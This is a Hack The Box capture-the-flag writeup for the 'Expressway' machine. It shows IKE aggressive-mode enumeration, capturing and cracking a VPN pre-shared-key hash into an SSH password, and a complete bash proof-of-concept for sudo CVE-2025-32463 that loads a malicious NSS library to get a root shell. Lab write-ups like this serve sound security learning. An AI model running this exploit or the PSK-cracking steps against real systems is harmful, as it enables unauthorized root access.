---
title: Expressway Writeup
date: 2025-10-01 20:00:00 +0000
categories:
  - Writeups
lang: en
tags:
  - HTB machines
  - IKE
  - VPN
description: Expressway HTB Writeup
image:
  path: '/assets/img/images/posts/expressway/Pasted image 20251001183550.png'
---

### Expressway Writeup

We start with Nmap to check for open ports

![[2025-10-01_21-43.png]]({{ "assets/img/images/posts/expressway/2025-10-01_21-43.png" | relative_url }}){: width="85%" } 

to get more details about version of SSH `-p 22 -sVC` to check for any outdated version or any interesting info.

![[2025-10-01_21-45.png]]({{ "assets/img/images/posts/expressway/2025-10-01_21-45.png" | relative_url }}){: width="85%" }

As this does not seem to be a way in (but at least we can confirm we have a `Debian` target based on the output.) we can also try to check for UDP ports, I found port 500 which Nmap says is probably the service `isakmp` (**Internet Security Association and Key Management Protocol**), having that port open

![[2025-10-01_21-51.png]]({{ "assets/img/images/posts/expressway/2025-10-01_21-51.png" | relative_url }}){: width="85%" }

I found this useful cheat sheet on [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html) about pentesting port `500`.

Output:
![[Screenshot From 2025-10-01 21-52-23.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-52-23.png" | relative_url }}){: width="85%" }

`1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation.`

### Before proceeding let's take a moment to understand IKE.

**IKE (Internet Key Exchange)** is the protocol used to establish secure tunnels in IPsec VPNs. It operates in two modes

**Main Mode**
it builds the IKE Security Association in six steps. First, the initiator sends proposals for encryption and authentication, and the responder picks one. Then they exchange Diffie-Hellman keys and other data to create a shared secret. Finally, both sides authenticate each other. After this, the channel is encrypted, and IPSec negotiation (Quick Mode) begins.

**Aggressive Mode**  
sets up the IKE Security Association in just three messages, which makes it faster than Main Mode. The initiator sends all its details first, the responder replies with its proposal, key exchange data, and identity, and then the initiator confirms. Quick and simple. but here’s the problem, both identities are sent in plain text before the channel is secure.

If you’re using a pre-shared key (PSK), it gets worse. The second and third messages include hashes based on the PSK, and these are also exposed. An attacker can capture them and run offline brute-force or dictionary attacks to recover the PSK.

with that in mind we can use `ike-scan` to try to use aggressive mode with the target with `-A`

![[Screenshot From 2025-10-01 21-52-38.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-52-38.png" | relative_url }}){: width="85%" }

As the target accepts aggressive mode it is useful for us as we can capture the hash during the handshake process we tell `ike-scan` to save the hash on the file `hash` using `--pskcrack`

![[Screenshot From 2025-10-01 21-53-56.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-53-56.png" | relative_url }}){: width="85%" }

![[2025-10-01_21-55.png]]({{ "assets/img/images/posts/expressway/2025-10-01_21-55.png" | relative_url }}){: width="85%" }

also we get

**The ID from the output of ike-scan:** `ike@expressway.htb` so `ike` could be used as our user to log in to SSH

To crack the hash we use `psk-crack` specify wordlist with `-d` and the `hash` file we captured

after cracking we get
`freakingrockstarontheroad`

And use it to SSH to the target.

![[Screenshot From 2025-10-01 21-55-58.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-55-58.png" | relative_url }}){: width="85%" }

![[Screenshot From 2025-10-01 21-56-51.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-56-51.png" | relative_url }}){: width="85%" }

And we got user flag!

While doing some enumeration, we run `sudo -V` to see the current version.

![[Screenshot From 2025-10-01 21-57-28.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-57-28.png" | relative_url }}){: width="85%" }

And with a little bit of help from `searchsploit`.

![[2025-10-01_21-57.png]]({{ "assets/img/images/posts/expressway/2025-10-01_21-57.png" | relative_url }}){: width="85%" }

to our pleasant surprise it is vulnerable.

to get root we can use this exploit CVE-2025-32463.

```bash
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF

# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
```

![[Screenshot From 2025-10-01 21-59-56 3.png]]({{ "assets/img/images/posts/expressway/Screenshot From 2025-10-01 21-59-56 3.png" | relative_url }}){: width="85%" }

And we get root.
